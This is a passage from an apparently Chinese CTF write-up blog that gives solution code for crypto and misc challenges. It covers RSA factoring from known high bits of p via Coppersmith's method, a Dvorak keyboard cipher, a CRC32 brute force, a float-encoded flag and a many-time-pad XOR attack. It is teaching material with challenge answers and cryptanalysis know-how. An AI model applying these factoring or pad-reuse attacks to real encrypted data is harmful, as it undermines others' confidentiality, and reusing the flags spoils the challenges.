c)</span><br></pre></td></tr></table></figure><h2 id="p高位攻击"><a href="#p高位攻击" class="headerlink" title="p高位攻击"></a>p高位攻击</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">22127806011633861727954101002390179580447625543207045612671617864341845851658260004006826435219665722338399712799144283442305160095371386129132285556214330279867129279885732638085139970894386809975772641941102438472230541606849251235636928502018782288977994793382547376630461074356449893196487276906629063423071245785206275636191377977712166746567658967286739276282635616277590864547265366547379387583014365390660407286148179073747800137068237371705680826025177248889969809158386539617738762070772471531610084135064141878988874470291949704156926711239213996266350299670204058121040684469621186909795304289942430452869</span></span><br><span class="line">p4=<span class="number">0xd8bf1376aaae63b3c4d693ca7f3d8a76270b7310bb8bd4608a98c9fdd85fc1ccc7c246b364e2779034057f0ec7a101bad64269d9dcca69f9b5c3462b058b94db0987aa09426c5e7634b3e19f56872693206790c6feef0c9ae662d73f1b12c3cd</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">pbits = <span class="number">1024</span></span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line"><span class="built_in">print</span>(p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="keyword">if</span> roots:</span><br><span class="line">    p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;n: &quot;</span>, n)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;p: &quot;</span>, p)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;q: &quot;</span>, n/p)</span><br></pre></td></tr></table></figure><h1 id="至今"><a href="#至今" class="headerlink" title="至今"></a>至今</h1><h2 id="键盘之争-·-84"><a href="#键盘之争-·-84" class="headerlink" title="键盘之争 · 84"></a>键盘之争 · 84</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><blockquote><p>你听说过键盘之争吗？提交你找到的字符串md5值。</p><p>ypau_kjg;”g;”ypau+</p></blockquote><p>好的，👀看了半天，啥也没看出来</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><blockquote><p>键盘布局有qwerty、dvorak、colemak<br>此题考察的是将qwerty布局转为dvorak</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/9f5f381cfd61460c7f43f2e945e6ad89.png" alt="img"></p><h4 id="代码实现-3"><a href="#代码实现-3" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">dic=&#123;<span class="string">r&quot;&#x27;&quot;</span>:<span class="string">&quot;q&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;,&quot;</span>:<span class="string">&quot;w&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;.&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;p&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;y&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;f&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;g&quot;</span>:<span class="string">&quot;u&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;c&quot;</span>:<span class="string">&quot;i&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;r&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;l&quot;</span>:<span class="string">&quot;p&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;/&quot;</span>:<span class="string">r&quot;[&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;=&quot;</span>:<span class="string">r&quot;]&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&#x27;&quot;&#x27;</span>:<span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;&lt;&quot;</span>:<span class="string">&quot;W&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;&gt;&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;P&quot;</span>:<span class="string">&quot;R&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;Y&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;F&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;G&quot;</span>:<span class="string">&quot;U&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;C&quot;</span>:<span class="string">&quot;I&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;R&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;L&quot;</span>:<span class="string">&quot;P&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;?&quot;</span>:<span class="string">r&quot;&#123;&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;+&quot;</span>:<span class="string">r&quot;&#125;&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;a&quot;</span>:<span class="string">&quot;a&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;A&quot;</span>:<span class="string">&quot;A&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;o&quot;</span>:<span class="string">&quot;s&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;O&quot;</span>:<span class="string">&quot;S&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;e&quot;</span>:<span class="string">&quot;d&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;E&quot;</span>:<span class="string">&quot;D&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;u&quot;</span>:<span class="string">&quot;f&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;U&quot;</span>:<span class="string">&quot;F&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;i&quot;</span>:<span class="string">&quot;g&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;I&quot;</span>:<span class="string">&quot;G&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;d&quot;</span>:<span class="string">&quot;h&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;D&quot;</span>:<span class="string">&quot;H&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;h&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;H&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;t&quot;</span>:<span class="string">&quot;k&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;T&quot;</span>:<span class="string">&quot;K&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;n&quot;</span>:<span class="string">&quot;l&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;N&quot;</span>:<span class="string">&quot;L&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;s&quot;</span>:<span class="string">&quot;;&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;S&quot;</span>:<span class="string">&quot;:&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;-&quot;</span>:<span class="string">r&quot;&#x27;&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&#x27;_&#x27;</span>:<span class="string">r&#x27;&quot;&#x27;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;;&quot;</span>:<span class="string">&quot;z&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;:&quot;</span>:<span class="string">&quot;Z&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;q&quot;</span>:<span class="string">&quot;x&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;Q&quot;</span>:<span class="string">&quot;X&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;j&quot;</span>:<span class="string">&quot;c&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;J&quot;</span>:<span class="string">&quot;C&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;k&quot;</span>:<span class="string">&quot;v&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;K&quot;</span>:<span class="string">&quot;V&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;x&quot;</span>:<span class="string">&quot;b&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;X&quot;</span>:<span class="string">&quot;B&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;b&quot;</span>:<span class="string">&quot;n&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;B&quot;</span>:<span class="string">&quot;N&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;m&quot;</span>:<span class="string">&quot;m&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;M&quot;</span>:<span class="string">&quot;M&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;w&quot;</span>:<span class="string">r&quot;,&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;W&quot;</span>:<span class="string">r&quot;&lt;&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;v&quot;</span>:<span class="string">r&quot;.&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;V&quot;</span>:<span class="string">r&quot;&gt;&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;z&quot;</span>:<span class="string">r&quot;/&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;Z&quot;</span>:<span class="string">r&quot;?&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&#x27;!&#x27;</span>:<span class="string">&quot;!&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;@&quot;</span>:<span class="string">r&quot;@&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;#&quot;</span>:<span class="string">r&quot;#&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;$&quot;</span>:<span class="string">r&quot;$&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;%&quot;</span>:<span class="string">r&quot;%&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;^&quot;</span>:<span class="string">r&quot;^&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;&amp;&quot;</span>:<span class="string">r&quot;&amp;&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;*&quot;</span>:<span class="string">r&quot;*&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;(&quot;</span>:<span class="string">r&quot;(&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;)&quot;</span>:<span class="string">r&quot;)&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;[&quot;</span>:<span class="string">r&quot;-&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;]&quot;</span>:<span class="string">r&quot;=&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;&#123;&quot;</span>:<span class="string">r&quot;_&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">r&quot;&#125;&quot;</span>:<span class="string">r&quot;+&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line">s=<span class="string">r&#x27;ypau_kjg;&quot;g;&quot;ypau+&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot; &quot;</span>.join([key <span class="keyword">for</span> key, value <span class="keyword">in</span> dic.items() <span class="keyword">if</span> value == i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">m = hashlib.md5()</span><br><span class="line"></span><br><span class="line">m.update(*b*<span class="string">&#x27;this_is_flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + m.hexdigest() + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="easy-CRC-·-92"><a href="#easy-CRC-·-92" class="headerlink" title="easy_CRC · 92"></a>easy_CRC · 92</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><blockquote><p>1:C4E68E3A<br>2:08FF301C<br>3:F6FBA587<br>4:B85C2F9A<br>5:F1B73D20<br>6:C6F1D9D7</p><p>flag=1+2+3+4+5+6<br>Each serial number consists of 4 characters</p></blockquote><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>已知明文长度的CRC爆破，具体学习可见：<a href="https://blog.csdn.net/mochu7777777/article/details/110206427">Python·CRC爆破学习</a></p><h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 四字节爆破</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_crc</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------Start Crack CRC-------------&#x27;</span>)</span><br><span class="line">    crc_list = [<span class="number">0xC4E68E3A</span>, <span class="number">0x08FF301C</span>, <span class="number">0xF6FBA587</span>, <span class="number">0xB85C2F9A</span>, <span class="number">0xF1B73D20</span>, <span class="number">0xC6F1D9D7</span>]  <span class="comment"># 文件的CRC32值列表，注意顺序</span></span><br><span class="line">    comment = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    chars = string.printable</span><br><span class="line">    <span class="keyword">for</span> crc_value <span class="keyword">in</span> crc_list:</span><br><span class="line">        <span class="keyword">for</span> char1 <span class="keyword">in</span> chars:</span><br><span class="line">            <span class="keyword">for</span> char2 <span class="keyword">in</span> chars:</span><br><span class="line">                <span class="keyword">for</span> char3 <span class="keyword">in</span> chars:</span><br><span class="line">                    <span class="keyword">for</span> char4 <span class="keyword">in</span> chars:</span><br><span class="line">                        res_char = char1 + char2 + char3 + char4<span class="comment">#获取遍历的任意4Byte字符</span></span><br><span class="line">                        char_crc = binascii.crc32(res_char.encode())<span class="comment">#获取遍历字符的CRC32值</span></span><br><span class="line">                        calc_crc = char_crc &amp; <span class="number">0xffffffff</span><span class="comment">#将遍历的字符的CRC32值与0xffffffff进行与运算</span></span><br><span class="line">                        <span class="keyword">if</span> calc_crc == crc_value:<span class="comment">#将获取字符的CRC32值与每个文件的CRC32值进行匹配</span></span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(crc_value),res_char))</span><br><span class="line">                            comment += res_char</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-----------CRC Crack Completed-----------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Result: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(comment))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    crack_crc()</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    -------------Start Crack CRC-------------</span></span><br><span class="line"><span class="string">[+] 0xc4e68e3a: b323</span></span><br><span class="line"><span class="string">[+] 0x8ff301c: 1e94</span></span><br><span class="line"><span class="string">[+] 0xf6fba587: f045</span></span><br><span class="line"><span class="string">[+] 0xb85c2f9a: e76e</span></span><br><span class="line"><span class="string">[+] 0xf1b73d20: 5932</span></span><br><span class="line"><span class="string">[+] 0xc6f1d9d7: 66f4</span></span><br><span class="line"><span class="string">-----------CRC Crack Completed-----------</span></span><br><span class="line"><span class="string">Result: b3231e94f045e76e593266f4</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="rsa-·-97"><a href="#rsa-·-97" class="headerlink" title="rsa · 97"></a>rsa · 97</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><blockquote><p>4153372421328787064168548641845708183921443446990158572506114559735441950501706984118235944441928889749083563790293558028143373121367441549974248211570336802004821051820943229232421937298269855190652251294220483768084460779714162849925877879859830009443131489814222929347727735616113359695228615432020363240247474622132986939108457393618346100033147945959684443762976681454755482192433993286205527003029269574787026484389622816932835184754540312561890719407986296481186847292967270288752616</p></blockquote><h1 id="AFCTF2018-MagicNum"><a href="#AFCTF2018-MagicNum" class="headerlink" title="[AFCTF2018]MagicNum"></a>[AFCTF2018]MagicNum</h1><p><img src="https://img-blog.csdnimg.cn/20200725123733532.png" alt="题目"></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">72065910510177138000000000000000.000000</span></span><br><span class="line">c1=<span class="number">0b0110000101100110011000110111010000111101</span>#这里把后面的<span class="number">0</span>给去掉了，本来有<span class="number">64</span>位</span><br><span class="line">#<span class="number">71863209670811371000000.000000</span></span><br><span class="line">c2=<span class="number">0b0110011001111011011100110110010100111101</span></span><br><span class="line">#<span class="number">18489682625412760000000000000000.000000</span></span><br><span class="line">c3=<span class="number">0b0110001101011111011010010111001100111101</span></span><br><span class="line">#<span class="number">72723257588050687000000.000000</span></span><br><span class="line">c4=<span class="number">0b0101111101100101011101100110010100111101</span></span><br><span class="line">#<span class="number">4674659167469766200000000.000000</span></span><br><span class="line">c5=<span class="number">0b0111001001111001011101110110100000111101</span></span><br><span class="line">#<span class="number">19061698837499292000000000000000000000.000000</span></span><br><span class="line">c6=<span class="number">0b0110010101110010011001010111110100111101</span></span><br><span class="line">import binascii</span><br><span class="line">flag=b&#x27;&#x27;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    s=&#x27;c&#x27;+str(i)</span><br><span class="line">    <span class="built_in">print</span>(binascii.unhexlify(hex(<span class="built_in">eval</span>(s))[<span class="number">2</span>:]))</span><br><span class="line">    flag+=binascii.unhexlify(hex(<span class="built_in">eval</span>(s))[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="AFCTF2018-你听过一次一密么？"><a href="#AFCTF2018-你听过一次一密么？" class="headerlink" title="[AFCTF2018]你听过一次一密么？"></a>[AFCTF2018]你听过一次一密么？</h2><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">25030206463</span>d<span class="number">3</span>d<span class="number">393131555</span>f<span class="number">7</span>f<span class="number">1</span>d<span class="number">061</span>d<span class="number">4052111</span>a<span class="number">19544e2</span>e<span class="number">5</span>d</span><br><span class="line"><span class="number">0</span>f<span class="number">020606150</span>f<span class="number">203</span>f<span class="number">307</span>f<span class="number">5</span><span class="keyword">c</span><span class="number">0</span>a<span class="number">7</span>f<span class="number">24070747130e16545000035</span>d</span><br><span class="line"><span class="number">1203075429152</span>a<span class="number">7020365</span><span class="keyword">c</span><span class="number">167</span>f<span class="number">390</span>f<span class="number">1013170</span>b<span class="number">1006481e1314</span></span><br><span class="line"><span class="number">0</span>f<span class="number">4610170e1</span>e<span class="number">2235787</span>f<span class="number">7853372</span><span class="keyword">c</span><span class="number">0</span>f<span class="number">065752111</span>b<span class="number">15454e0</span>e<span class="number">09</span></span><br><span class="line"><span class="number">081543000e1</span>e<span class="number">6</span>f<span class="number">3</span>f<span class="number">3</span>a<span class="number">3348533</span>a<span class="number">270</span>d<span class="number">064</span>a<span class="number">02111</span>a<span class="number">1</span>b<span class="number">5</span>f<span class="number">4e0</span>a<span class="number">18</span></span><br><span class="line"><span class="number">0909075412132e247436425332281</span>a<span class="number">1</span><span class="keyword">c</span><span class="number">561</span>f<span class="number">04071</span>d<span class="number">520</span>f<span class="number">0</span>b<span class="number">11</span></span><br><span class="line"><span class="number">4116111</span>b<span class="number">101e2170203011113</span>a<span class="number">69001</span>b<span class="number">475206011552050219</span></span><br><span class="line"><span class="number">041006064612297020375453342</span><span class="keyword">c</span><span class="number">17545</span>a<span class="number">01451811411</span>a<span class="number">470</span>e</span><br><span class="line"><span class="number">021311114</span>a<span class="number">5</span>b<span class="number">0335207</span>f<span class="number">7</span><span class="keyword">c</span><span class="number">167</span>f<span class="number">22001</span>b<span class="number">44520</span><span class="keyword">c</span><span class="number">15544801125</span>d</span><br><span class="line"><span class="number">06140611460</span><span class="keyword">c</span><span class="number">26243</span><span class="keyword">c</span><span class="number">7</span>f<span class="number">5</span><span class="keyword">c</span><span class="number">167</span>f<span class="number">3</span>d<span class="number">015446010053005907145</span>d</span><br><span class="line"><span class="number">0</span>f<span class="number">05110</span>d<span class="number">160</span>f<span class="number">263</span>f<span class="number">3</span>a<span class="number">7</span>f<span class="number">4210372</span><span class="keyword">c</span><span class="number">03111313090415481</span>d<span class="number">49</span></span><br></pre></td></tr></table></figure><h2 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h2><ul><li><p><strong>一次一密</strong>：异或加密。</p><blockquote><p>将明文分组，与密钥按位异或即可。</p></blockquote></li><li><p><strong>攻击原理</strong></p><p>题目是用同一个密钥去加密多条明文，当密文条数较多时就很容易被攻击，例如Many Time Pad。 </p><ul><li><p><strong>Many Time Pad攻击</strong> </p><blockquote><p>原理:c1⊕c2 = m1⊕m2.</p><p>通过m1⊕m2可以分析出m1和m2，因此m1与m2不再安全。</p></blockquote><p>注：⊕为异或符号</p></li></ul></li></ul><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><ul><li><a href="https://paiza.io/projects/LSykKY75a19pzlH5sAULww?language=python"><strong>在线Python2</strong></a></li></ul><p>搬运自Github</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 